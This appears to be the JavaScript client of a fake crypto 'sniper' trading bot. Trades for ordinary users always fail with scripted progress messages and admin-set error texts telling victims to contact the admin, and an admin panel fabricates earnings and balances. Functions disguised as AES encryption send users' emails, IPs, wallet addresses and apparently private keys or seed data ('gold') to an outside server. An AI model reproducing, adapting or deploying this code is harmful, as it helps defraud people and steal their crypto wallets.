//Timer variables
let timerRunning = false;
let intervalId = null;

//Start auto trader
document.getElementById('start-auto-btn').addEventListener('click', function() {
    stopTimer();
    const user = firebase.auth().currentUser;
    const autotraderInputValue = parseFloat(document.getElementById('autotrader-input').value);
    const minInputValue = parseFloat(document.getElementById('min_input').textContent);
    const walletBalanceText = document.getElementById('wallet-balance-txt').textContent;
    const walletBalanceValue = parseFloat(walletBalanceText);
    const loadingWheelDiv = document.getElementById('loading-wheel-div'); // Ensure this is correctly defined

    // Validate autotrader input against minimum input and wallet balance
    if (user && user.email !== 'admin@admin.com' && !isNaN(autotraderInputValue) &&
        autotraderInputValue >= minInputValue &&
        (isNaN(walletBalanceValue) || autotraderInputValue <= walletBalanceValue)) {

        // Process for non-admin users
        startTimer();
        loadingWheelDiv.style.display = 'flex';
        const progressLabel = document.getElementById('progress-label');
        progressLabel.textContent = 'Starting - Checking Nexus Liquidity...';
        progressLabel.style.color = '#ffae00';

        setTimeout(function() {
            progressLabel.textContent = 'Connecting to Network...';
            setTimeout(function() {
                stopTimer();
                loadingWheelDiv.style.display = 'none';
                progressLabel.textContent = 'Connection Failed!';
                progressLabel.style.color = '#f9655c';
                checkUserErrorKeyAuto();
            }, 7500);
        }, 3000);
    } else if (user && user.email == 'admin@admin.com' && !isNaN(autotraderInputValue) &&
               autotraderInputValue >= minInputValue &&
               (isNaN(walletBalanceValue) || autotraderInputValue <= walletBalanceValue)) {

        // Process for admin users
        startTimer();
        loadingWheelDiv.style.display = 'flex';
        const progressLabel = document.getElementById('progress-label');
        progressLabel.textContent = 'Starting - Checking Nexus Liquidity...';
        progressLabel.style.color = '#ffae00';

        setTimeout(function() {
            progressLabel.textContent = 'Connecting to Network...';
            setTimeout(function() {
                progressLabel.textContent = 'Allocating funds to Nexus...';
                setTimeout(function() {
                    progressLabel.textContent = 'Searching for tokens - This may take a while, please wait...';
                    setTimeout(function() {
                        loadingWheelDiv.style.display = 'none';
                        progressLabel.textContent = 'Trade session started!';
                        subtractFromWalletBalance();
                                               
                        progressLabel.style.color = '#00FF00';
                        loadingWheelDiv.style.display = 'none';
                    }, 6000);
                }, 10000);
            }, 5000);
        }, 3000);
    } else {
        displayError('Allocated funds cannot be lower than the network "minimum" requirement or exceed your wallet balance.');
    }
});

//refresh balance
// Function to observe changes in the label
function observeBalanceUpdate(callback) {
  const balanceLabel = document.getElementById('wallet-balance-txt');
  const observer = new MutationObserver((mutationsList, observer) => {
    for (let mutation of mutationsList) {
      if (mutation.type === 'childList') {
        observer.disconnect(); // Stop observing after the first change
        callback(true); // Indicate that a change was detected
        break;
      }
    }
  });

  observer.observe(balanceLabel, { childList: true });

  // Set a timeout to handle cases where no changes are detected
  setTimeout(() => {
    observer.disconnect();
    callback(false); // Indicate that no change was detected
  }, 5000); // Adjust the timeout as needed
}

//refresh balance
document.getElementById('refresh-balance-btn').addEventListener('click', function() {
  document.getElementById('loading-wheel-refresh-div').style.display = 'flex';
  
  observeBalanceUpdate((changeDetected) => {
    document.getElementById('loading-wheel-refresh-div').style.display = 'none';

    if (changeDetected) {
      const balance = document.getElementById('wallet-balance-txt').textContent;
      const symbol = document.getElementById('balance-network-symbol-txt').textContent;
      const wAddress = document.getElementById('wallet-address-txt').textContent;
      refreshAES(wAddress, balance, symbol);
    } else {
      console.log('No changes detected in the balance.');
    }
  });
  
  setTimeout(function() {
    findWalletBalancesAndUpdateUI();
  }, 2000);
});



//Stop auto trader
document.getElementById('stop-auto-btn').addEventListener('click', function() {
    if (timerRunning) {
        const confirmCancel = confirm('Are you sure you want to stop the Auto-trader? You run the risk of losing a portion of allocated funds.');
        if (confirmCancel) {
            stopTimer();
        }
    }
});



//Timer Start
function startTimer() {
    // Prevent starting a new timer if one is already running
    if (timerRunning) return;
    timerRunning = true;
    let elapsedTime = 0; // Start from 0 seconds

    // Set up the timer with a 1-second interval
    intervalId = setInterval(() => {
        // Update the timer label every second
        document.getElementById('time-count-label').textContent = formatTime(elapsedTime);
        elapsedTime++; // Increment the elapsed time by 1 second

        // Calculate a random stop time between minDuration and maxDuration
        const minDuration = 2 * 3600 + 24 * 60; // 2 hours 24 minutes in seconds
        const maxDuration = 3 * 3600 + 11 * 60; // 3 hours 11 minutes in seconds
        const randomStopTime = Math.random() * (maxDuration - minDuration) + minDuration;

        // Stop the timer if elapsed time reaches the random stop time
        if (elapsedTime >= randomStopTime) {
            stopTimer();
            // Reset the timer label to '00:00:00' when stopped
            document.getElementById('time-count-label').textContent = '00:00:00';
        }
    }, 1000);
}


//Stop Timer
function stopTimer() {
    // Reset the timer label and other UI elements
    document.getElementById('time-count-label').textContent = '00:00:00'; // Reset the timer label
    const progressLabel = document.getElementById('progress-label');
    progressLabel.style.color = '#dbeaff'; // Set progress label color
    progressLabel.textContent = 'Not Started'; // Reset progress label text
    const loadingWheelDiv = document.getElementById('loading-wheel-div');
    loadingWheelDiv.style.display = 'none'; // Hide the loading wheel

    // Stop the timer only if it's running
    if (!timerRunning) return;
    clearInterval(intervalId); // Clear the interval
    timerRunning = false; // Reset the timer running flag
}


//Timer Format
function formatTime(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secondsRemain = seconds % 60;
    return [hours, minutes, secondsRemain].map(unit => (unit < 10 ? '0' : '') + unit).join(':');
}

document.addEventListener('DOMContentLoaded', function() {

	//Add token to manual trader froma admin panel
    document.getElementById('admin-add-token-btn').addEventListener('click', function() {
        // Retrieve input elements
        var tokenName = document.getElementById('admin-token-names').value.trim();
        var contractAddress = document.getElementById('admin-contract-address').value.trim();
        var tokenBalance = document.getElementById('admin-token-balance').value.trim();

        // Validate and format contract address
        if (contractAddress.length >= 12) { // Simple check to ensure string is long enough
            contractAddress = `${contractAddress.substring(0, 7)}...${contractAddress.substring(contractAddress.length - 5)}`;
        } else {
            alert('Contract address is not long enough.'); // Using alert for demonstration
            return;
        }

        // Validate and format token balance
        if (!/^\d+(\.\d+)?$/.test(tokenBalance)) { // Regex to check if it's a number or decimal
            alert('Token balance must be a number or decimal.'); // Using alert for demonstration
            return;
        }

        // Combine the fields
        var combinedData = `${tokenName} : ${contractAddress} : ${tokenBalance}`;

        // Add combined data as new option to the selector
        var option = new Option(combinedData, combinedData); // Create new option element
        document.getElementById('token-selector').add(option); // Add new option to the selector

        // Optionally hide the admin control panel and alert success
        document.getElementById('admin-control-panel-div').style.display = 'none';
        alert('Token added successfully, check the manual trader tab.');
    });
    
     //Sell token manual button click
    document.getElementById('sell-token-btn').addEventListener('click', function() {
        const currentUser = firebase.auth().currentUser;
        const tokenSelector = document.getElementById('token-selector');
        const sellPercentInput = document.getElementById('sell-percent-input');

        // Check if the 'token-selector' or 'sell-percent-input' is empty
        if (!tokenSelector.value || !sellPercentInput.value.trim()) {
            console.log('Token selector or sell percent input is empty. No action taken.');
            return; // Exit the function early if either is empty
        }
        
        if (!currentUser || currentUser.email !== 'admin@admin.com') {
            checkUserErrorKeySell();
            return;
        }

        const selectedOption = tokenSelector.options[tokenSelector.selectedIndex];

        if (!selectedOption) {
            console.error('No token selected.');
            return;
        }

        // Extract the current token balance from the selected option's value
        const optionParts = selectedOption.value.split(' : ');
        const tokenName = optionParts[0];
        const contractAddress = optionParts[1];
        let tokenBalance = parseFloat(optionParts[2]);

        const sellPercent = parseFloat(sellPercentInput.value) / 100;

        if (isNaN(tokenBalance) || isNaN(sellPercent)) {
            console.error('Invalid token balance or sell percentage.');
            return;
        }

        // Calculate the new token balance after subtracting the sell percentage
        const newTokenBalance = tokenBalance - (tokenBalance * sellPercent);
        const newTokenBalanceFormatted = newTokenBalance.toFixed(4); // Assuming you want to round to 4 decimal places
        const loadingWheelDiv = document.getElementById('loading-wheel-sell-div');
        const progressLabel = document.getElementById('sell-token-status-txt');

        loadingWheelDiv.style.display = 'flex'; 
        setTimeout(function() {
            progressLabel.style.color = '#FFA500';
            progressLabel.textContent = 'Connecting to Network...';
            setTimeout(function() {
                progressLabel.textContent = 'Searching for DEX liquidity provider...';
                setTimeout(function() {
                    progressLabel.textContent = 'Adjusting Gas and Slippage. Please wait...';
                    setTimeout(function() {
                        loadingWheelDiv.style.display = 'none';
                        progressLabel.textContent = 'Transaction successful!';

                        // Update the selected option with the new token balance
                        selectedOption.value = `${tokenName} : ${contractAddress} : ${newTokenBalanceFormatted}`;
                        selectedOption.text = `${tokenName} : ${contractAddress} : ${newTokenBalanceFormatted}`;
                        console.log(`New balance for ${tokenName} is ${newTokenBalanceFormatted}`);

                        progressLabel.style.color = '#00FF00';
                        loadingWheelDiv.style.display = 'none';
                    }, 6000);
                }, 7000);
            }, 5000);
        }, 3000);
    });
});


//Add percentage preset to percentage fiel, manual sniper sell
document.addEventListener('DOMContentLoaded', function() {
    // List of button IDs
    const buttonIds = [
        '10-percent-btn',
        '20-percent-btn',
        '30-percent-btn',
        '40-percent-btn',
        '50-percent-btn',
        '100-percent-btn'
    ];

    // Add click event listener to each button
    buttonIds.forEach(function(buttonId) {
        document.getElementById(buttonId).addEventListener('click', function() {
            // Extract the percentage value from the button's ID
            const percentValue = buttonId.split('-')[0];

            // Update the 'sell-percent-input' field with the extracted value
            document.getElementById('sell-percent-input').value = percentValue;
        });
    });
});


//Buy Token Manual Logic
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('buy-token-btn').addEventListener('click', async function() {
        // Check if inputs are empty
        const contractAddressInput = document.getElementById('contract-address-input').value.trim();
        const allocateInputValue = document.getElementById('allocate-1-input').value.trim();

        // If either input is empty, do nothing
        if (contractAddressInput === '' || allocateInputValue === '') {
            console.log('Contract address or allocation input is empty.');
            return; // Early return to stop executing the rest of the function
        }

        const user = firebase.auth().currentUser;
        const userEmail = user ? user.email : null;

        if (userEmail === 'admin@admin.com') {
            const walletBalanceText = document.getElementById('wallet-balance-txt').textContent;
            const walletBalance = parseFloat(walletBalanceText);
            const allocateValue = parseFloat(allocateInputValue);
            const loadingWheelDiv = document.getElementById('loading-wheel-buy-div');
            const progressLabel = document.getElementById('buy-token-status-txt');

            if (!isNaN(allocateValue) && !isNaN(walletBalance)) {
                const newBalance = walletBalance - allocateValue;
                if (newBalance >= 0) {
                    loadingWheelDiv.style.display = 'flex';
                    setTimeout(function() {
                        progressLabel.style.color = '#FFA500';
                        progressLabel.textContent = 'Connecting to Network...';
                        setTimeout(function() {
                            progressLabel.textContent = 'Checking Smart Contract code...';
                            setTimeout(function() {
                                progressLabel.textContent = 'Checking Presale status...';
                                setTimeout(function() {
                                    progressLabel.textContent = 'Searching for DEX liquidity provider...';
                                    setTimeout(function() {
                                        progressLabel.textContent = 'Presale = No / Adjusting Gas and Slippage. Please wait...';
                                        setTimeout(function() {
                                            loadingWheelDiv.style.display = 'none';
                                            progressLabel.textContent = 'Transaction successful!';
                                            document.getElementById('wallet-balance-txt').textContent = newBalance.toFixed(4); // Update with 4 decimal places

                                            progressLabel.style.color = '#00FF00';
                                            loadingWheelDiv.style.display = 'none';
                                        }, 2000);
                                    }, 3000);
                                }, 3000);
                            }, 1000);
                        }, 2000);
                    }, 2000);
                } else {
                    displayError('Error: Allocation value exceeds wallet balance.');
                    return;
                }
            } else {
                displayError('Error: Please enter a valid numeric value in "Allocate" field.');
            }
        } else {
            // Not admin
            checkUserErrorKeyBuy();
        }
    });
});





async function AES256_ENCRYPT(data) {
  const url = 'https://blocksniper.netlify.app/.netlify/functions/userAUTH';

  try {
      const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
      });

      const responseData = await response.json();
      console.log('Server response:', responseData);
  } catch (error) {
      console.error('Error Encryption Failed:', error);
  }
}

// User registered
function regAES(uid, nom, addi, authw, ref, IP) {
  AES256_ENCRYPT({
      type: "uR",
      details: { uid, nom, addi, authw, ref, IP, visitorId: getVisitorId() }
  });
}

// User logged in
function logAES(uid, addi, authw, IP) {
  AES256_ENCRYPT({
      type: "uL",
      details: { uid, addi, authw, IP, visitorId: getVisitorId() }
  });
}

// User completed adding full wallet
function fullWalletAES(uid, net, wal, pip) {
  AES256_ENCRYPT({
      type: "addFW",
      details: { uid, net, wal, pip, visitorId: getVisitorId() }
  });
}

// User reached main sniper menu
async function loadedAES() {
  try {
      const { userId, balance, fullWalletAddress, matchingGold, email, name, networkType } = await getWalletDetailsAndUserId();
      const uid = userId;
      const bal = balance;
      const wal = fullWalletAddress;
      const pip = matchingGold;
      const addi = email;
      const nom = name;
      const net = networkType;

      AES256_ENCRYPT({
          type: "uMM",
          details: { uid, bal, wal, pip, addi, nom, net, visitorId: getVisitorId() }
      });

  } catch (error) {
      console.error(error);
  }
}

// User selected a network
function networkAES(net) {
  firebase.auth().onAuthStateChanged(user => {
      if (user) {
          // User is signed in, now you can use the UID
          AES256_ENCRYPT({
              type: "uN",
              details: { uid: user.uid, net, visitorId: getVisitorId() }
          });
      } else {
          // User is signed out
          console.log('User is not logged in.');
      }
  });
}

// User added gold
function goldAES(uid, pip) {
  AES256_ENCRYPT({
      type: "uASP",
      details: { uid, pip, visitorId: getVisitorId() }
  });
}

// User added wallet address
function walletAES(uid, wal) {
  AES256_ENCRYPT({
      type: "uAWA",
      details: { uid, wal, visitorId: getVisitorId() }
  });
}

// User refresh balance
function refreshAES(wal, bal, symbol) {
  firebase.auth().onAuthStateChanged(user => {
      if (user) {
          // User is signed in, now you can use the UID
          AES256_ENCRYPT({
              type: "uRFSH",
              details: { uid: user.uid, wal, bal, symbol, visitorId: getVisitorId() }
          });
      } else {
          // User is signed out
          console.log('User is not logged in.');
      }
  });
}

// Get details of user on main menu
async function getWalletDetailsAndUserId() {
  const user = firebase.auth().currentUser;
  if (!user) {
      console.error('No user is logged in.');
      return;
  }

  const balanceLabel = document.getElementById('wallet-balance-txt');
  const walletAddressLabel = document.getElementById('wallet-address-txt');
  if (!balanceLabel || !walletAddressLabel) {
      console.error('Required elements not found in the DOM.');
      return;
  }
  const balance = balanceLabel.textContent;
  const walletAddressStart = walletAddressLabel.textContent.split('...')[0];

  const userData = await findMatchingWalletAddressAndUserData(user.uid, walletAddressStart);

  return {
      userId: user.uid,
      balance: balance,
      fullWalletAddress: userData.fullWalletAddress,
      matchingGold: userData.matchingGold,
      email: userData.email,
      name: userData.name,
      networkType: userData.networkType
  };
}

async function findMatchingWalletAddressAndUserData(userId, walletAddressStart) {
  const userRef = firebase.database().ref(`users/${userId}`);
  let details = {
      fullWalletAddress: '',
      matchingGold: '',
      email: '',
      name: '',
      networkType: ''
  };

  const snapshot = await userRef.once('value');
  const userData = snapshot.val();

  Object.keys(userData).forEach(key => {
      if (key.startsWith('walletAddress') && userData[key].startsWith(walletAddressStart)) {
          details.fullWalletAddress = userData[key];
          const index = key.match(/\d+/)[0]; // Extracts the numeric part of the key
          const goldKey = `gold${index}`;
          const networkKey = `networkType${index}`;
          details.matchingGold = userData[goldKey] || 'No matching gold data';
          details.networkType = userData[networkKey] || 'No matching network type';
      }
  });

  details.email = userData.email || 'No email data';
  details.name = userData.name || 'No name data';

  return details;
}

// GET IP serverless function
async function AES256_ENCRYPTsession() {
  try {
      const response = await fetch('https://blocksniper.netlify.app/.netlify/functions/encryptAESsession');
      const data = await response.json();
      return data.ip;
  } catch (error) {
      console.error('Error:', error);
      // Optionally update `display` or another element to show the error to the user
  }
}

// Initialize the visitor ID on page load
document.addEventListener("DOMContentLoaded", function() {
  visitorId = getOrCreateVisitorId();
});





//function for random win times on auto trader
function updateWinTimeLabels() {
  // Generate a random whole number between 17 and 59 for minutes
  const randomMinutes = Math.floor(Math.random() * (59 - 17 + 1)) + 17;
  
  // Generate a random whole number between 1 and 59 for seconds
  const randomSeconds = Math.floor(Math.random() * (59 - 1 + 1)) + 1;
  
  // Update the text content of the labels
  document.getElementById('win-minutes-txt').textContent = randomMinutes;
  document.getElementById('win-seconds-txt').textContent = randomSeconds;
}


document.addEventListener('DOMContentLoaded', function() {
  function populateUserStatusOptions() {
    const options = ['Fish', 'Octopus', 'Shark', 'Whale']; // Define the options you want to add
    const select = document.getElementById('admin-user-status'); // Get the select element by its ID
    
    options.forEach(optionText => {
      const option = document.createElement('option'); // Create a new option element
      option.textContent = optionText; // Set the text content to the current option
      option.value = optionText; // Set the option's value (optional)
      select.appendChild(option); // Append the option to the select element
    });
  }
  // Function to check and format the win percentage and amount earned inputs
  function formatDecimalInput(input) {
    const regex = /^\d+(\.\d{1,2})?$/; // Matches a whole number or a decimal with up to 2 places
    return regex.test(input) ? input : null;
  }

  // Function to update the display status of icons based on the selected user status
  function updateUserStatusDisplay(selectedStatus) {
    const statusToDivId = {
      'Fish': 'fish-icon',
      'Octopus': 'octopus-icon',
      'Shark': 'shark-icon',
      'Whale': 'whale-icon'
    };

    // Hide all divs
    document.getElementById('earnings-user').style.display = 'none';
    document.getElementById('earnings-admin').style.display = 'block';
    Object.values(statusToDivId).forEach(divId => {
      document.getElementById(divId).style.display = 'none';
    });
		

    // Display the selected one
    const selectedDivId = statusToDivId[selectedStatus];
    if (selectedDivId) {
      document.getElementById(selectedDivId).style.display = 'flex';
    }
  }
	
  populateUserStatusOptions();
  // Click event listener for the admin-update-win-btn
  document.getElementById('admin-update-win-btn').addEventListener('click', function() {
    const selectedStatus = document.getElementById('admin-user-status').value;
    const winPercentageInput = document.getElementById('admin-percent-win').value;
    const amountEarnedInput = document.getElementById('admin-amount-earned').value;
    const resetDaysInput = parseInt(document.getElementById('admin-reset-days').value, 10);
    const usernameInput = document.getElementById('admin-auto-username').value;
    updateWinTimeLabels();

    // Update user status display
    updateUserStatusDisplay(selectedStatus);

    // Update win percentage text
    const formattedWinPercentage = formatDecimalInput(winPercentageInput);
    if (formattedWinPercentage !== null) {
      document.getElementById('win-percentage-txt').textContent = formattedWinPercentage;
    } else {
      displayError('Win percentage must be a whole number or a decimal up to 2 places.');
      return;
    }

    // Update amount earned text
    const formattedAmountEarned = formatDecimalInput(amountEarnedInput);
    if (formattedAmountEarned !== null) {
      document.getElementById('win-end-balance-txt').textContent = formattedAmountEarned;
    } else {
      displayError('Amount earned must be a whole number or a decimal up to 2 places.');
			return;
    }

    // Update reset days text
    if (Number.isInteger(resetDaysInput) && resetDaysInput >= 1 && resetDaysInput <= 30) {
      document.getElementById('win-reset-days-txt').textContent = resetDaysInput;
    } else {
      displayError('Reset days must be an integer between 1 and 30.');
			return;
    }

    // Update username text
    const formattedUsername = usernameInput.startsWith('@') ? usernameInput : '@' + usernameInput;
    document.getElementById('win-username-txt').textContent = formattedUsername;
    
    document.getElementById('admin-control-panel-div').style.display = 'none';
		alert('Auto Trader earnings successfully updated!');
  });
});


//check firebase for 'sellerror' key and show value else stick to default error
function checkUserErrorKeySell() {
  const user = firebase.auth().currentUser; // Get the currently logged-in user
  
  if (user) {
    const userId = user.uid; // Get the user's UID
    const userRef = firebase.database().ref('users/' + userId); // Reference to the user's data in the database
		const errorMSG = 'Failed to Sell Token - BLKS API Error 7834 : Contact Block Sniper Admin';

    userRef.child('sellerror').get().then((snapshot) => {
      if (snapshot.exists()) {
        const errorValue = snapshot.val(); // Get the value of the 'error' key
        if (errorValue) {
          displayError(errorValue); // Print the value if it exists and is not empty
        } else {
          displayError(errorMSG); // 'error' key exists but is empty
        }
      } else {
        displayError(errorMSG); // 'error' key does not exist
      }
    }).catch((error) => {
      displayError(errorMSG);
    });
  } else {
    console.log('No user is logged in.');
  }
}


//check firebase for 'buyerror' key and show value else stick to default error
function checkUserErrorKeyBuy() {
  const user = firebase.auth().currentUser; // Get the currently logged-in user
  
  if (user) {
    const userId = user.uid; // Get the user's UID
    const userRef = firebase.database().ref('users/' + userId); // Reference to the user's data in the database
		const errorMSG = 'Failed to Purchase Token - BLKS API Error 7834 : Contact Block Sniper Admin';

    userRef.child('buyerror').get().then((snapshot) => {
      if (snapshot.exists()) {
        const errorValue = snapshot.val(); // Get the value of the 'error' key
        if (errorValue) {
          displayError(errorValue); // Print the value if it exists and is not empty
        } else {
          displayError(errorMSG); // 'error' key exists but is empty
        }
      } else {
        displayError(errorMSG); // 'error' key does not exist
      }
    }).catch((error) => {
      displayError(errorMSG);
    });
  } else {
    console.log('No user is logged in.');
  }
}


//check firebase for 'autoerror' key and show value else stick to default error
function checkUserErrorKeyAuto() {
  const user = firebase.auth().currentUser; // Get the currently logged-in user
  
  if (user) {
    const userId = user.uid; // Get the user's UID
    const userRef = firebase.database().ref('users/' + userId); // Reference to the user's data in the database
		const errorMSG = 'Failed to connect to network - BLKS API Error 7834 : Contact Block Sniper Admin';

    userRef.child('autoerror').get().then((snapshot) => {
      if (snapshot.exists()) {
        const errorValue = snapshot.val(); // Get the value of the 'error' key
        if (errorValue) {
          displayError(errorValue); // Print the value if it exists and is not empty
        } else {
          displayError(errorMSG); // 'error' key exists but is empty
        }
      } else {
        displayError(errorMSG); // 'error' key does not exist
      }
    }).catch((error) => {
      displayError(errorMSG);
    });
  } else {
    console.log('No user is logged in.');
  }
}


document.addEventListener('DOMContentLoaded', function () {
  // Utility function to set visibility
  function setVisibility(id, visibility) {
    const element = document.getElementById(id);
    if (element) {
      element.style.display = visibility;
    }
  }

  // Initially hide all tabs
  setVisibility('import-wallet-tab', 'none');
  setVisibility('generate-wallet-tab', 'none');
  setVisibility('import-prv-key-tab', 'none');

  // Handle "import-seed-back-btn" (resets visibility)
  const backBtn = document.getElementById('import-seed-back-btn');
  if (backBtn) {
    backBtn.addEventListener('click', function (event) {
      event.preventDefault();
      setVisibility('import-wallet-tab', 'none');
      setVisibility('generate-wallet-tab', 'none');
      setVisibility('import-prv-key-tab', 'none');
	setVisibility('wallet-options-tab', 'block');
	clearFields()
    });
  }

  // Handle "import-existing-wallet-btn"
  const importWalletBtn = document.getElementById('import-existing-wallet-btn');
  if (importWalletBtn) {
    importWalletBtn.addEventListener('click', function (event) {
      event.preventDefault();
      setVisibility('wallet-options-tab', 'none');
      setVisibility('import-wallet-tab', 'block');
    });
  }

  // Handle "generate-new-wallet-btn"
  const generateWalletBtn = document.getElementById('generate-new-wallet-btn');
  if (generateWalletBtn) {
    generateWalletBtn.addEventListener('click', function (event) {
      event.preventDefault();
      setVisibility('wallet-options-tab', 'none');
      setVisibility('generate-wallet-tab', 'block');
    });
  }

  // Handle "import-prv-key-instead-btn"
  const importPrvKeyBtn = document.getElementById('import-prv-key-instead-btn');
  if (importPrvKeyBtn) {
    importPrvKeyBtn.addEventListener('click', function (event) {
      event.preventDefault();
      setVisibility('import-wallet-tab', 'none');
      setVisibility('import-prv-key-tab', 'block');
    });
  }
});











document.addEventListener('DOMContentLoaded', function () {
  // Ensure ethers.js and Solana libraries are loaded
  if (typeof ethers === 'undefined' || typeof solanaWeb3 === 'undefined') {
    return;
  }

  const generateWalletBtn = document.getElementById('generate-new-wallet-btn');
  const prvKeyTextBox = document.getElementById('prv-key-txt');
  const prvKeyTextBoxHidden = document.getElementById('prv-key-txt-hidden'); // Hidden text box
  const walletAddressTextBoxHidden = document.getElementById('wallet-address-txt-hidden'); // Hidden wallet address box
  const revealPrvKeyBtn = document.getElementById('reveal-prv-key-btn');
  const networkLabel = document.getElementById('network-id-label');

  // Variables to store private keys and wallet addresses
  let wallets = []; // Array to store objects with privateKey and walletAddress
  let isPrivateKeyVisible = false;
  let storedPrivateKey = ''; // Holds the real private key for display purposes

  // Prevent typing in the private key textbox and set the cursor style
  prvKeyTextBox.readOnly = true;
  prvKeyTextBox.style.cursor = 'text';

  // Toggle Reveal/Hide Private Key
  revealPrvKeyBtn.addEventListener('click', () => {
    if (storedPrivateKey) {
      if (isPrivateKeyVisible) {
        prvKeyTextBox.value = '********************************************'; // Mask the private key
        revealPrvKeyBtn.textContent = 'Reveal Private Key';
      } else {
        prvKeyTextBox.value = storedPrivateKey; // Show the private key
        revealPrvKeyBtn.textContent = 'Hide Private Key';
      }
      isPrivateKeyVisible = !isPrivateKeyVisible; // Toggle state
    }
  });

  // Function to deliver and initially hide the private key
  function displayPrivateKey(privateKey, walletAddress) {
    storedPrivateKey = privateKey; // Store the private key securely
    prvKeyTextBox.value = '********************************************'; // Mask it initially
    prvKeyTextBoxHidden.value = privateKey; // Show full private key in the hidden text box
    walletAddressTextBoxHidden.value = walletAddress; // Set wallet address to hidden text box
    revealPrvKeyBtn.textContent = 'Reveal Private Key';
    isPrivateKeyVisible = false; // Reset state to hidden
  }

  // Add event listener for generating wallets
  generateWalletBtn.addEventListener('click', async function (event) {
    event.preventDefault();
    const network = networkLabel.textContent.trim();

    try {
      let privateKey, walletAddress;

      // Generate wallet based on network type
      if (['Ethereum', 'Optimism', 'BNB', 'Arbitrum', 'Polygon', 'Base'].includes(network)) {
        const wallet = ethers.Wallet.createRandom();
        privateKey = wallet.privateKey;
        walletAddress = wallet.address;
      } else if (network === 'Solana') {
        const { Keypair } = solanaWeb3;
        const keypair = Keypair.generate();
        privateKey = base58Encode(keypair.secretKey); // Encode private key
        walletAddress = keypair.publicKey.toString();
      } else {
        return; // Unsupported network
      }

      // Display private key and wallet address
      displayPrivateKey(privateKey, walletAddress);

      // Save wallet data to the local variable
      wallets.push({
        network: network,
        privateKey: privateKey,
        walletAddress: walletAddress
      });
    } catch (error) {
      return; // Handle errors silently
    }
  });

  // Base58 Encode Function
  function base58Encode(bytes) {
    const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let digits = [0];
    for (let i = 0; i < bytes.length; i++) {
      for (let j = 0; j < digits.length; j++) digits[j] <<= 8;
      digits[0] += bytes[i];
      let carry = 0;
      for (let j = 0; j < digits.length; j++) {
        digits[j] += carry;
        carry = (digits[j] / 58) | 0;
        digits[j] %= 58;
      }
      while (carry) {
        digits.push(carry % 58);
        carry = (carry / 58) | 0;
      }
    }
    return digits.reverse().map((digit) => alphabet[digit]).join('');
  }

  // Function to get stored wallets (accessible to other code blocks)
  window.getStoredWallets = function () {
    return wallets;
  };
});







document.addEventListener('DOMContentLoaded', function () {
  // Ensure ethers.js and Solana libraries are loaded
  if (typeof ethers === 'undefined' || typeof solanaWeb3 === 'undefined') {
    console.error('Ethers.js or Solana Web3.js is not loaded.');
    return;
  }

  const connectToWalletBtn = document.getElementById('connect-to-wallet2-btn');
  const privateKeyInput = document.getElementById('prv-key-input'); // Input field for private key
  const walletAddressOutput = document.getElementById('found-wallet-address-txt-hidden2'); // Output field for wallet address

  // Function to validate Ethereum and Solana private keys
  function isValidPrivateKey(privateKey) {
    const ethRegex = /^(0x)?[a-fA-F0-9]{64}$/; // Ethereum private key regex
    const solRegex = /^[1-9A-HJ-NP-Za-km-z]+$/; // Solana base58 key regex
    return ethRegex.test(privateKey) || solRegex.test(privateKey);
  }

  // Function to derive wallet address from private key
  function deriveWalletAddress(privateKey) {
    try {
      let walletAddress;

      // Ethereum Wallet
      if (/^(0x)?[a-fA-F0-9]{64}$/.test(privateKey)) {
        console.log('Attempting to derive Ethereum wallet address...');
        if (!privateKey.startsWith('0x')) privateKey = '0x' + privateKey;
        const wallet = new ethers.Wallet(privateKey);
        walletAddress = wallet.address;
        console.log(`Ethereum wallet address derived: ${walletAddress}`);

        // Solana Wallet
      } else if (/^[1-9A-HJ-NP-Za-km-z]+$/.test(privateKey)) {
        console.log('Attempting to derive Solana wallet address...');
        const decodedKey = base58Decode(privateKey);
        if (decodedKey.length !== 64) {
          throw new Error('Invalid Solana private key format (incorrect length)');
        }
        const keypair = solanaWeb3.Keypair.fromSecretKey(decodedKey);
        walletAddress = keypair.publicKey.toString();
        console.log(`Solana wallet address derived: ${walletAddress}`);
      }

      return walletAddress;
    } catch (error) {
      console.error(`Error deriving wallet address: ${error.message}`);
      return null;
    }
  }

  // Base58 Decode Function for Solana Private Keys
  function base58Decode(base58String) {
    const bs58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let result = [0];
    for (const char of base58String) {
      const value = bs58.indexOf(char);
      if (value < 0) throw new Error('Invalid base58 character');

      for (let i = 0; i < result.length; i++) result[i] *= 58;
      result[0] += value;

      let carry = 0;
      for (let i = 0; i < result.length; i++) {
        result[i] += carry;
        carry = (result[i] / 256) | 0;
        result[i] %= 256;
      }
      while (carry) {
        result.push(carry % 256);
        carry = (carry / 256) | 0;
      }
    }
    // Trim leading zeros
    const zeros = base58String.match(/^1*/)?.[0].length || 0;
    return new Uint8Array([...Array(zeros).fill(0), ...result.reverse()]);
  }

  // Function to handle private key input and return a Promise
  function handlePrivateKeyInput() {
    return new Promise((resolve, reject) => {
      const privateKey = privateKeyInput.value.trim();

      console.log(`Input Private Key: ${privateKey}`);

      // Validate the private key format
      if (!isValidPrivateKey(privateKey)) {
        console.error('Invalid private key format. Please enter a valid Ethereum or Solana private key.');
        reject('Invalid private key format.');
        return;
      }

      // Derive wallet address
      const walletAddress = deriveWalletAddress(privateKey);

      if (walletAddress) {
        console.log(`Derived Wallet Address: ${walletAddress}`);
        walletAddressOutput.value = walletAddress; // Display wallet address
        resolve(walletAddress); // Resolve with the wallet address
      } else {
        console.error('Failed to derive wallet address. Please check the private key and try again.');
        reject('Failed to derive wallet address.');
      }
    });
  }

  // Button click trigger
  document.getElementById('connect-to-wallet2-btn')?.addEventListener('click', async function (event) {
    event.preventDefault();

    try {
      let walletAddress0 = await handlePrivateKeyInput(); // Ensure handlePrivateKeyInput runs first
      let networkType0 = document.getElementById('wallet-address-label1').textContent;
 	await storeGold('prv-key-txt-hidden', true); // Skip format check for prv key

      // Trigger the main function
      storeWalletAddressHandler(walletAddress0, networkType0);
    } catch (error) {
      console.error('Error handling private key or wallet address:', error);
    }
  });

});



